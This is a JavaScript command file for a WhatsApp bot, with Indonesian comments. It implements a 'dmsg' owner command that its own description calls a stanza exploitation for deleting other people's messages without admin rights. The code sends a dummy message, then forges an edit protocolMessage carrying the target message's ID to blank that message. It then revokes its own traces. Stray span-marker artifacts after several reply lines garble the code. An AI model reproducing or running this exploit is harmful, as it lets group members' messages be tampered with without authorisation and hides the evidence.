import { delay } from 'zapo-js';

export default {
    command: 'dmsg',
    category: 'owner',
    description: 'Menghapus pesan orang lain tanpa akses admin (Eksploitasi Stanza)',
    onlyOwner: true,
    
    async execute(m, context) {

        const { sock } = context;
        const chatId = m.chat;
        const q = m.quoted;

        // Validasi awal
        if (!q) {
            return await m.reply('Reply pesan yang ingin diproses.');[span_4](start_span)[span_4](end_span)
        }
        
        if (!m.isGroup) {
            return await m.reply('Fitur ini khusus digunakan di dalam grup.');[span_6](start_span)[span_6](end_span)
        }

        const stanzaId = q.key?.id || q.id; 
        if (!stanzaId) {
            return await m.reply('Gagal mendapatkan ID pesan target.');[span_7](start_span)[span_7](end_span)
        }

        try {

            const tempMsg = await sock.message.send(chatId, {
                groupStatusMessageV2: {
                    message: {
                        extendedTextMessage: {
                            text: '',
                            contextInfo: {
                                isGroupStatus: true,
                            },
                        },
                    },
                },
            });

            const tempId = tempMsg?.key?.id || tempMsg?.id;

            const editMsg = await sock.message.send(chatId, {
                protocolMessage: {
                    key: {
                        remoteJid: chatId,
                        fromMe: true,
                        id: tempId,
                    },
                    type: 14,
                    editedMessage: {
                        extendedTextMessage: {
                            text: '\0',
                            contextInfo: {
                                isGroupStatus: false,
                            },
                        },
                    },
                },
            }, { id: stanzaId }); // Memaksa injeksi ID ke pesan target
            
            const tempId2 = editMsg?.key?.id || editMsg?.id;

            await delay(100);

            // 3. Menghapus jejak dummy & paket edit menggunakan metode revoke
            await Promise.allSettled([
                sock.message.send(chatId, {
                    type: 'revoke',
                    target: { id: tempId, fromMe: true }
                }),
                sock.message.send(chatId, {
                    type: 'revoke',
                    target: { id: tempId2, fromMe: true }
                })
            ]);
        } catch (e) {
            console.error('[dmsg]', e);
            await m.reply(`Error: ${e?.message || e}`);
        }
    }
};
